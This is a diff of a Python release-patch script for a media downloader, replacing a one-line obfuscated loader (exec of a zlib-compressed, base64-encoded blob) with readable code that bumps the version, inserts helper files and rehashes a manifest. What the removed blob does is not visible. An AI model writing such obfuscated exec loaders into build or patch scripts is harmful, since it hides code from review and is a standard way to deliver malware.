@@ -1,2 +1,129 @@
-import base64, zlib
-exec(compile(zlib.decompress(base64.b64decode('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')), '<release_patch_32_46>', 'exec'))
+from pathlib import Path
+import hashlib
+import json
+import os
+import re
+import sys
+
+TARGET_VERSION = "32.46"
+
+
+def replace_once(text, old, new, label):
+    if old not in text:
+        raise RuntimeError(f"Patch anchor missing: {label}")
+    return text.replace(old, new, 1)
+
+
+def sha256_file(path):
+    digest = hashlib.sha256()
+    with open(path, "rb") as handle:
+        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
+            digest.update(chunk)
+    return digest.hexdigest()
+
+
+version = str(sys.argv[1] if len(sys.argv) > 1 else "").strip()
+if version != TARGET_VERSION:
+    raise SystemExit(f"This patch prepares only v{TARGET_VERSION}; got {version!r}")
+
+app_path = Path("payload/app.py")
+updater_path = Path("payload/z2se_updater.pyw")
+manifest_path = Path("payload/update_manifest.json")
+helpers_path = Path("v3246_helpers.txt")
+worker_insert_path = Path("v3246_worker_insert.txt")
+
+for required in (app_path, updater_path, manifest_path, helpers_path, worker_insert_path):
+    if not required.is_file():
+        raise FileNotFoundError(required)
+
+text = app_path.read_text(encoding="utf-8-sig")
+
+# Version bump.
+text, count = re.subn(
+    r'APP_VERSION\s*=\s*"32\.45"',
+    'APP_VERSION = "32.46"',
+    text,
+    count=1,
+)
+if count != 1:
+    raise RuntimeError("Could not update APP_VERSION 32.45 -> 32.46")
+
+# Smart Meta resolver needs base64 for efg metadata and query-pair editing.
+if not re.search(r"^import base64\s*$", text, flags=re.MULTILINE):
+    text = replace_once(text, "import json\n", "import json\nimport base64\n", "import base64")
+
+old_url_import = "from urllib.parse import urlparse, parse_qs, urlsplit, urlunsplit, urljoin"
+new_url_import = "from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlsplit, urlunsplit, urljoin"
+if new_url_import not in text:
+    text = replace_once(text, old_url_import, new_url_import, "urllib.parse helpers")
+
+# Insert deterministic self-healing Meta/Facebook helper layer before the
+# existing generic browser candidate resolver.
+helpers = helpers_path.read_text(encoding="utf-8").strip() + "\n\n"
+if "def _fb_strip_range(" not in text:
+    helper_anchor = "def _browser_media_candidate_urls(primary_url, media_candidates):"
+    position = text.find(helper_anchor)
+    if position < 0:
+        raise RuntimeError("Meta helper insertion anchor missing")
+    text = text[:position] + helpers + text[position:]
+
+# Insert the smart Facebook recovery stage before the generic candidate loop.
+worker_insert = worker_insert_path.read_text(encoding="utf-8").rstrip() + "\n"
+if "V32.46 SMART META SELF-HEALING" not in text:
+    resolver_anchor = (
+        "            resolver_urls = _browser_media_candidate_urls(\n"
+        "                normalized_media_url,\n"
+        "                media_candidates,\n"
+        "            )\n"
+    )
+    position = text.find(resolver_anchor)
+    if position < 0:
+        raise RuntimeError("Browser worker resolver anchor missing")
+    text = text[:position] + worker_insert + text[position:]
+
+# Let the extension send richer candidate sets when a page exposes many DASH
+# fragments. The bridge remains local-only and still validates the payload.
+text = text.replace(
+    "if length <= 0 or length > 65536:",
+    "if length <= 0 or length > 524288:",
+    1,
+)
+
+# Keep more captured candidates available to the final generic resolver too.
+text = text.replace("    return result[:12]\n", "    return result[:32]\n", 1)
+
+# Small robustness fix seen in the user's v32.45 log: tolerate a UTF-8 BOM in
+# JSON config files by reading with utf-8-sig where the update config is read.
+text = text.replace(
+    'with open(APP_UPDATE_CONFIG_FILE, "r", encoding="utf-8") as handle:',
+    'with open(APP_UPDATE_CONFIG_FILE, "r", encoding="utf-8-sig") as handle:',
+)
+
+app_path.write_text(text, encoding="utf-8", newline="\n")
+
+# Refresh manifest after the patch.
+manifest = json.loads(manifest_path.read_text(encoding="utf-8-sig"))
+manifest["version"] = TARGET_VERSION
+manifest["created_by"] = "GitHub Actions / v32.46 Smart Self-Healing Meta Resolver"
+
+file_map = {
+    "app.py": app_path,
+    "z2se_updater.pyw": updater_path,
+}
+
+entries = []
+for name, path in file_map.items():
+    entries.append(
+        {
+            "path": name,
+            "sha256": sha256_file(path),
+            "size": os.path.getsize(path),
+        }
+    )
+manifest["files"] = entries
+manifest_path.write_text(
+    json.dumps(manifest, ensure_ascii=False, indent=2) + "\n",
+    encoding="utf-8",
+)
+
+print(f"Prepared Z2SE v{TARGET_VERSION} Smart Self-Healing Meta Resolver")
